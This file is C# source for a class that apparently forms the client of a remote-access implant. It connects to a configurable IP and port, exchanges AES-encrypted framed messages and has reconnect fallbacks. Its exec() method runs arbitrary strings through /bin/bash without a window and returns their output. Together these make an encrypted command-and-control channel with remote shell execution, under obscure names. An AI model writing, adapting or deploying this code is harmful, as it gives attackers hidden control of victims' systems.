using System.Runtime.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Asn1;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Asn1.Pkcs;
using cevsn.encrn.rsa;
using RSA = cevsn.encrn.rsa.RSA;
using cevsn.encrn;

namespace tevsn
{
    public class Tevsn
    {
        public String IP { get;set; }
        public IPEndPoint ServerAddress {get;set;}
        public int Port { get;set; }
        private BinaryReader? reader;
        private BinaryWriter? writer;
        public TcpClient tcpClient = new TcpClient();
        private RSA? rsa;
        private AES? aes;
        
        public Tevsn(string ip, int port, RSA rsa)
        {
            this.IP = ip;
            this.rsa = rsa;
            this.Port = port;
            this.ServerAddress = new IPEndPoint(IPAddress.Parse(ip), port);
        }

        public Tevsn(string ip, int port, AES aes)
        {
            this.IP = ip;
            this.aes = aes;
            this.Port = port;
            this.ServerAddress = new IPEndPoint(IPAddress.Parse(ip), port);
        }

        //try to connect, if success, return true
        public bool Connect()
        {
            try
            {
                tcpClient.Connect(IP, Port);
                return true;
            }
            catch (Exception e)
            {   
                e.ToString();
                return false;
            }
        }

        //write disconnect method
        public void Disconnect()
        {
            if (tcpClient.Connected)
            {
                writer!.Close();
                reader!.Close();
                tcpClient.Close();
            }
        }

        public bool Fallback()
        {
            try
            {
                tcpClient.Close();
                return true;
            } catch (Exception) {
                Console.Write("wtf." + "\n");
                return false;
            }
        }

        //check if connection is alive
        public bool IsConnected()
        {
            try
            {
                if (tcpClient.Client.Poll(0, SelectMode.SelectRead))
                {
                    byte[] buff = new byte[1];
                    if (tcpClient.Client.Receive(buff, SocketFlags.Peek) == 0)
                    {
                        return false;
                    }
                }
                return true;
            }
            catch (Exception)
            {
                Console.Write("Client isn't connected anymore!" + "\n");
                return false;
            }
        }

        public void Send(String data)
        {
            NetworkStream clientStream = tcpClient.GetStream();

            writer = new BinaryWriter(clientStream);

            //string toSend = rsa.Encrypt(data);
            string toSend = aes!.encrypt(data);
            byte[] toSendBytes = Encoding.UTF8.GetBytes(toSend);
            byte[] lenBytes = BitConverter.GetBytes(toSendBytes.Length);

            Console.Write("Sending: " + toSend + "\n");
            Array.Reverse(lenBytes);
            writer.Write(lenBytes);
            writer.Write(toSendBytes);
            writer.Flush();
        }

        public String Receive()
        {
            try
            {
                String message;
                NetworkStream clientStream = tcpClient.GetStream();

                reader = new BinaryReader(clientStream);

                byte[] lenBytes = reader.ReadBytes(4);
                
                Array.Reverse(lenBytes);

                int len = BitConverter.ToInt32(lenBytes);
                byte[] bytes = reader.ReadBytes(len);

                if(bytes.Length > 1)
                {
                    string str = Encoding.UTF8.GetString(bytes);
                    byte[] b64 = Convert.FromBase64String(str);

                    //message = rsa.Decrypt(b64);
                    message = aes!.decrypt(str);
                    Console.Write("Received: " + message + "\n");

                    return message;
                }
                else 
                {
                    return "--";
                }
            } catch (Exception) {
                return "reviveTime";
            }
        }

        public string exec(String cmd)
        {
            Process p = new Process();
            var escapedArgs = cmd.Replace("\"", "\\\"");

            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "/bin/bash";
            p.StartInfo.Arguments = $"-c \"{escapedArgs}\"";
            p.StartInfo.CreateNoWindow = true;

            p.Start();

            string output = p.StandardOutput.ReadToEnd();

            p.WaitForExit();

            Console.Write("Console Output: " + output + "\n");

            return output;
        }

    }
}
